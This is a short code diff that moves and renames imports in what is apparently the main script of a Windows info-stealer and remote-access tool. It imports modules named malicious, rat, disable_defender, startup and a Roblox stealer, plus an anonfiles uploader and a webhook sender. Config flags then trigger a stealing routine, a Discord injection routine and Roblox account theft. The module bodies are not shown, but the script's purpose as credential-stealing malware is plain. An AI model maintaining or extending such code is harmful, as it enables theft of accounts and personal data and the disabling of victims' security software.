@@ -1,4 +1,18 @@
-from requirements_installation import requirementsinstallation
+import requirements_installation
+import _webhook
+import discordc
+import informations
+import malicious
+import rat
+import InjectX
+import startup
+from config import Config
+from _roblox import RobloxX
+from anonFile import uploadToAnonfiles
+from disable_defender import disabledefender
+ii = informations.Info()
+_webh = _webhook.WebhookX()
+cc = Config()
 
 try:
     import getpass
@@ -27,21 +41,6 @@ try:
     from PIL import ImageGrab
 except Exception:
     requirementsinstallation()
-
-import _webhook
-import discordc
-import informations
-import malicious
-import rat
-import injectX
-from config import Config
-from _roblox import RobloxX
-from anonFile import uploadToAnonfiles
-from startup import StartUp
-from disable_defender import disabledefender
-ii = informations.Info()
-_webh = _webhook.WebhookX()
-cc = Config()
 
 
 if platform.system() != "Windows":
@@ -861,7 +860,7 @@ if cc.get_malicious_stealing() == True:
     send_malicious()
 
 if cc.get_injection() == True:
-    injection.InjectionX(webhook)
+    InjectX.InjectionX(webhook)
 
 if cc.get_roblox_stealing() == True:
     RobloxX().run()
